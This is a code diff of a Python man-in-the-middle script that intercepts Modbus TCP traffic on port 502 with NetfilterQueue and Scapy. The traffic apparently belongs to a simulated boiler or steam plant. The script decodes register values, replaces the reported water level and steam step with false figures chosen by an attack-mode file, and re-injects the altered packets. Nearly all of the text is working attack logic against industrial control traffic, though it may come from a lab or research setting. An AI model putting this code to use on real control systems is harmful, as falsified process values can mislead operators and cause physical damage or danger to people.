@@ -26,39 +26,43 @@ def plx(x):
 def runAttack(response, pkt):
     sc_pkt = IP(pkt.get_payload())
     ip_hex = toHex(str(sc_pkt))
-    if sc_pkt[IP].src == MODBUS_SLAVE and sc_pkt[TCP].sport == 502 and ip_hex[118:120] == '03' and ip_hex[120:122] == '2a':
+    print(sc_pkt[IP].dst)
+    print(sc_pkt[TCP].dport)
+    print(ip_hex[118:120])
+    print(ip_hex[124:130])
+
+    if sc_pkt[IP].dst == MODBUS_SLAVE and sc_pkt[TCP].dport == 502 and ip_hex[118:120] == '10' and ip_hex[124:130] == '001224':
         registers = []
 
-        for i in range(0, 21):
-            index = 122 + (4 * i)
+        for i in range(0, 18):
+            index = 130 + (4 * i)
             registers.append(int(ip_hex[index:index + 4], 16))
-
-        addWater = ne.modbusDecode(0, 2, 2, registers)
-        addFire = ne.modbusDecode(2, 2, 0, registers)
-        waterLevel = ne.modbusDecode(3, 4, 4, registers)
-        waterTemp = ne.modbusDecode(7, 2, 2, registers)
-        powerOut = ne.modbusDecode(9, 6, 2, registers)
-        steamStep = ne.modbusDecode(13, 2, 4, registers)
-        powerIn = ne.modbusDecode(16, 6, 2, registers)
-        serverSeconds = ne.modbusDecode(20, 2, 0, registers)
-
-        if response == '1':
+            print(int(ip_hex[index:index + 4], 16))
+        print("listed")
+        waterLevel = ne.modbusDecode(0, 4, 4, registers)
+        waterTemp = ne.modbusDecode(4, 2, 2, registers)
+        powerOut = ne.modbusDecode(6, 6, 2, registers)
+        steamStep = ne.modbusDecode(10, 2, 4, registers)
+        powerIn = ne.modbusDecode(13, 6, 2, registers)
+        serverSeconds = ne.modbusDecode(17, 2, 0, registers)
+        response = int(response)
+        if response == 1:
             #10,000L below optimal level
             waterLevel = 500000 - 10000
             steamStep *= 1.5
-        if response == '2':
+        if response == 2:
             #1,000L below optimal level
             waterLevel = 500000 - 1000
-        if response == '3':
+        if response == 3:
             # Constantly 1,500L below optimum level +- 15%
             waterLevel = 500000 - (1500 * (random.randint(85, 115) / 100))
-        if response == '4':
+        if response == 4:
             # Constantly 1,500L below optimum level +- 15% + last add of water from master
             waterLevel = 500000 - (1500 * (random.randint(85, 115) / 100)) + addWater
 
         outputs = []
-        outputs = ne.modbusEncode(addWater, 2, 2, outputs)
-        outputs = ne.modbusEncode(addFire, 2, 0, outputs)
+        print(response)
+        print("LEVEL" + str(waterLevel))
         outputs = ne.modbusEncode(waterLevel, 4, 4, outputs)
         outputs = ne.modbusEncode(waterTemp, 2, 2, outputs)
         outputs = ne.modbusEncode(powerOut, 6, 2, outputs)
@@ -76,26 +80,33 @@ def runAttack(response, pkt):
                 add = '0' + str(add)
             payload += plx(add[0:2]) + plx(add[2:4])
 
-        sc_pkt[Raw].load = sc_pkt[Raw].load[0:9] + payload
+        print(toHex(sc_pkt[Raw].load))
+        sc_pkt[Raw].load = sc_pkt[Raw].load[0:13] + payload
+        print(toHex(sc_pkt[Raw].load))
 
         del sc_pkt[IP].chksum
         del sc_pkt[TCP].chksum
-        #print(sc_pkt.show2())
-        send(sc_pkt)
-        pkt.drop()
+        sc_pkt.show2()
+        #send(sc_pkt)
+        #pkt.drop()
+        print(str(pkt))
+        pkt.set_payload(str(sc_pkt))
+        print(str(pkt))
+        pkt.accept()
     else:
         pkt.accept()
 
 def mitm(pkt):
-    f = open("RIAttackMode.txt")
+    f = open("RIAMode.txt")
     mode = f.readline()
-    print "[" + mode + "]"
+    #print "[" + mode + "]"
 
     if mode != 'n':
         runAttack(mode, pkt)
     else:
-        print(len(pkt.get_payload()))
+        #print(len(pkt.get_payload()))
         pkt.accept()
+    f.close()
 
 nfqueue = NetfilterQueue()
 nfqueue.bind(1, mitm)
